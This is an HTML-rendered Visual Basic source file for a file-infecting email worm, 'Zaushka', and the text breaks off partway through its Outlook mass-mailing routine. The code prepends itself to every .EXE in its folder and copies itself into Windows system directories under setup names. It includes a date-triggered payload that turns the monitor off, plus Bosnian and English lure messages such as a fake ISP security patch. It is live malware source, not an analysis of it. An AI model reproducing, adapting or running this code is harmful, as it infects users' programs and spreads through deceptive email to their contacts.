<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Zush - zaushka.bas.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc2 {
	font-weight: bold;
	color: #FF0000;
}
.sc3 {
	color: #0000FF;
}
.sc4 {
	color: #808080;
}
.sc6 {
	font-weight: bold;
}
.sc7 {
}
.sc9 {
}
.sc10 {
}
.sc11 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc3">Option</span><span class="sc0"> </span><span class="sc3">Explicit</span><span class="sc0">

</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">path</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">strsave</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">Duzina</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">zrtva</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">NasKod</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">ZrtvinKod</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">mDatoteka</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">velicina2</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">velicina</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">32768</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">rezultat</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">Program</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">ProgramskiID</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">Napolje</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">STILL_ACTIVE</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H103</span><span class="sc0">
</span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">PROCESS_ALL_ACCESS</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H1F0FFF</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Enum</span><span class="sc0"> </span><span class="sc7">MonitorState</span><span class="sc0">
    </span><span class="sc7">MonitorOff</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Enum</span><span class="sc0">

</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">OpenProcess</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwDesiredAccess</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">bInheritHandle</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwProcessId</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetExitCodeProcess</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hProcess</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lpExitCode</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">CloseHandle</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hObject</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">SendMessage</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"user32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"SendMessageA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hwnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">wMsg</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">wParam</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lParam</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetWindowsDirectory</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"GetWindowsDirectoryA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpBuffer</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">nSize</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetSystemDirectory</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"GetSystemDirectoryA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpBuffer</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">nSize</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Form_Load</span><span class="sc6">():</span><span class="sc0"> </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">SloboDan</span><span class="sc0">
</span><span class="sc7">SloboDan</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FreeFile</span><span class="sc0">

</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">App.path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">App.EXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".EXE"</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Binary</span><span class="sc0"> </span><span class="sc7">Access</span><span class="sc0"> </span><span class="sc7">Read</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc9">#SloboDan
</span><span class="sc0">
    </span><span class="sc7">NasKod</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space$</span><span class="sc6">(</span><span class="sc7">velicina</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">NasKod</span><span class="sc0">

</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc9">#SloboDan
</span><span class="sc0">
</span><span class="sc7">zrtva</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Dir</span><span class="sc6">(</span><span class="sc7">App.path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"*.EXE"</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">zrtva</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">


</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">App.path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">zrtva</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Binary</span><span class="sc0"> </span><span class="sc7">Access</span><span class="sc0"> </span><span class="sc7">Read</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc9">#SloboDan
</span><span class="sc0">
    </span><span class="sc7">ZrtvinKod</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space$</span><span class="sc6">(</span><span class="sc7">LOF</span><span class="sc6">(</span><span class="sc7">SloboDan</span><span class="sc6">))</span><span class="sc0">
    </span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ZrtvinKod</span><span class="sc0">

</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc9">#SloboDan
</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">ZrtvinKod</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">ZrtvinKod</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"z"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">

</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">zrtva</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Binary</span><span class="sc0"> </span><span class="sc7">Access</span><span class="sc0"> </span><span class="sc7">Write</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc9">#SloboDan
</span><span class="sc0">    
    </span><span class="sc7">Put</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">NasKod</span><span class="sc0">
    </span><span class="sc7">Put</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">velicina</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ZrtvinKod</span><span class="sc0">
    </span><span class="sc7">Put</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">LOF</span><span class="sc6">(</span><span class="sc7">SloboDan</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc4">"z"</span><span class="sc0">
    
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc9">#SloboDan
</span><span class="sc0">    
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">zrtva</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Dir</span><span class="sc6">()</span><span class="sc0">

</span><span class="sc3">Wend</span><span class="sc0">

</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">App.path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">App.EXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".EXE"</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Binary</span><span class="sc0"> </span><span class="sc7">Access</span><span class="sc0"> </span><span class="sc7">Read</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc9">#SloboDan
</span><span class="sc0">
</span><span class="sc7">velicina2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">LOF</span><span class="sc6">(</span><span class="sc7">SloboDan</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc7">velicina</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">velicina2</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">

    </span><span class="sc7">NasKod</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space</span><span class="sc6">(</span><span class="sc7">velicina2</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">velicina</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">NasKod</span><span class="sc0">

</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc9">#SloboDan
</span><span class="sc0">
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">App.path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">App.EXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".ex$"</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Binary</span><span class="sc0"> </span><span class="sc7">Access</span><span class="sc0"> </span><span class="sc7">Write</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc9">#SloboDan
</span><span class="sc0">
</span><span class="sc7">Put</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">NasKod</span><span class="sc0">

</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc9">#SloboDan
</span><span class="sc0">
</span><span class="sc7">ProgramskiID</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Shell</span><span class="sc6">(</span><span class="sc7">App.path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">App.EXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".ex$"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbNormalFocus</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Program</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">OpenProcess</span><span class="sc6">(</span><span class="sc7">PROCESS_ALL_ACCESS</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Program</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">GetExitCodeProcess</span><span class="sc0"> </span><span class="sc7">Program</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Napolje</span><span class="sc0">

</span><span class="sc3">Do</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">Napolje</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">STILL_ACTIVE</span><span class="sc0">
</span><span class="sc7">DoEvents</span><span class="sc0">
</span><span class="sc7">GetExitCodeProcess</span><span class="sc0"> </span><span class="sc7">Program</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Napolje</span><span class="sc0">
</span><span class="sc3">Loop</span><span class="sc0">

</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">Kill</span><span class="sc0"> </span><span class="sc7">App.path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">App.EXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".ex$"</span><span class="sc0">

</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Day</span><span class="sc6">(</span><span class="sc7">Now</span><span class="sc6">())</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc7">Month</span><span class="sc6">(</span><span class="sc7">Now</span><span class="sc6">())</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">

    </span><span class="sc7">MsgBox</span><span class="sc0"> </span><span class="sc4">"Doci ce dan kad cu JA naslijediti planetu,"</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
               </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"i sve sto mi se na putu nadje"</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
                         </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"istruhnuce!"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbCritical</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Win32.HLLP.Zaushka.Worm v1.0 by e[ax]"</span><span class="sc0">
                         
    </span><span class="sc7">SetOpcijeMonitora</span><span class="sc0"> </span><span class="sc7">Form1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">MonitorOff</span><span class="sc0">

</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">FileCopy</span><span class="sc0"> </span><span class="sc7">mDatoteka</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Winpath</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">"\Setup.EXE"</span><span class="sc0">
</span><span class="sc7">FileCopy</span><span class="sc0"> </span><span class="sc7">mDatoteka</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Syspath</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">"\Setup32.EXE"</span><span class="sc0">

</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">Emailanje</span><span class="sc0">
</span><span class="sc7">Form1.Visible</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">SetOpcijeMonitora</span><span class="sc6">(</span><span class="sc7">frmForm</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Form</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">stanje</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">MonitorState</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">rezultat</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc7">rezultat</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">SendMessage</span><span class="sc6">(</span><span class="sc7">frmForm.hwnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">&amp;H112</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">&amp;HF170</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">stanje</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Emailanje</span><span class="sc6">():</span><span class="sc0"> </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">poruka1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">poruka2</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">prva</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">druga</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">treca</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">cetvrta</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc11">c</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">d</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">g</span><span class="sc0">
    
    </span><span class="sc7">prva</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Hi! I missed you so much!"</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
         </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"I was on holiday last week so please take a look at my image collection!"</span><span class="sc0">
    
    </span><span class="sc7">druga</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Zdravo!"</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
          </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Ako imas vremena, molim te pogledaj ovaj program peticije!"</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
          </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Nadamo se tvom glasu!"</span><span class="sc0">
    
    </span><span class="sc7">treca</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Postovani korisnici!"</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
          </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Na Internetu se pojavio veoma opasan crv koji se vec prosirio i na nase prostore!"</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
          </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Da bi zaustavili crva, molimo da instalirate ovaj patch za MS Internet Explorer!"</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
          </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Unaprijed se zahvaljujemo,"</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
          </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Bih.net.ba Team"</span><span class="sc0">
          
    </span><span class="sc7">cetvrta</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Hej jarane!"</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
            </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Mi smo jedna programerska grupa koja se bavi programiranjem u VB-u, C++-u, itd."</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
            </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Saljemo ti email, ako zelis da nam se pridruzis u zajednickom radu na jednom velikom projektu"</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
            </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"na kojem sada radimo, a tice se malog biznisa!"</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
            </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Za vise informacija oko tog projekta pogledaj fin. program koji ti saljemo!"</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
            </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Hvala unaprijed!"</span><span class="sc0">
            
    </span><span class="sc7">poruka1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Array</span><span class="sc6">(</span><span class="sc7">prva</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">druga</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">treca</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">cetvrta</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">poruka2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">poruka1</span><span class="sc6">(</span><span class="sc10">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">))</span><span class="sc0">
    
    </span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Outlook.Application"</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">a.getnamespace</span><span class="sc6">(</span><span class="sc4">"MAPI"</span><span class="sc6">)</span><span class="sc0">
